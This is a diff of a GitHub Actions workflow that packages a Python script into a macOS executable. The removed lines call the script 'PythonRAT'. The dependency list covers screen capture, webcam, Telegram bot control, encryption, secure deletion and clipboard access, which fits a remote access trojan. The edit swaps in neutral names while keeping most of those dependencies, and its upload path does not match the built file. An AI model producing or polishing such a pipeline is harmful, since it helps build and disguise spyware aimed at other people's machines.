@@ -1,38 +1,33 @@
-name: Build macOS binary
+name: Build macOS Standalone Binary
+
 on:
+  push:
+    branches: [ main ]
   workflow_dispatch:
 
 jobs:
   build:
-    runs-on: macos-13   # Intel runner; use macos-latest for Apple Silicon target
+    runs-on: macos-14
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout Code
+        uses: actions/checkout@v4
 
-      - uses: actions/setup-python@v5
+      - name: Set up Python
+        uses: actions/setup-python@v5
         with:
-          python-version: "3.11"
+          python-version: '3.11'
 
-      - name: Install dependencies
+      - name: Install Dependencies
         run: |
-          pip install pyinstaller numpy opencv-python-headless pyttsx3 telebot pyAesCrypt secure-delete pyperclip pillow mss
+          python -m pip install --upgrade pip
+          pip install pyinstaller mss opencv-python pyttsx3 pyTelegramBotAPI pyAesCrypt secure-delete pyperclip
 
-      - name: Build
+      - name: Compile to Binary
         run: |
-          python -m PyInstaller --onefile \
-            --collect-all numpy \
-            --collect-all cv2 \
-            --hidden-import=mss \
-            --hidden-import=pyttsx3 \
-            --hidden-import=telebot \
-            --hidden-import=pyAesCrypt \
-            --hidden-import=secure_delete \
-            --hidden-import=pyperclip \
-            --hidden-import=PIL \
-            --hidden-import=xml.etree.ElementTree \
-            --name PythonRAT PythonRAT.py
+          pyinstaller --onefile --clean my1script.py
 
-      - name: Upload artifact
+      - name: Upload Executable
         uses: actions/upload-artifact@v4
         with:
-          name: PythonRAT-macos
-          path: dist/PythonRAT
+          name: macos-binary
+          path: dist/your_script
